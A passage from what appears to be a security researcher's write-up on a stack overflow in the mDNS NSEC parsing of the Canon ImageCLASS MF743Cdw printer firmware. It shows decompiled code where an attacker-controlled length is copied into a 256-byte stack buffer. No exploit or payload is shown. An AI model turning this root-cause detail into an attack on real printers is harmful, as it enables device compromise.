&lt;p&gt;The RDATA section varies depending on the ‘type’. When type=NSEC, its format is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;More details can reference to RFC6762.&lt;/p&gt;

&lt;p&gt;Other element is not important in this vulnerability, so we won’t explain more here. More detail can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt;, &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt; and &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the Answer field (type NSEC) in mDNS header, there is a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt;, it will parse answer section.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------- [1]  stack overflow &lt;/span&gt;
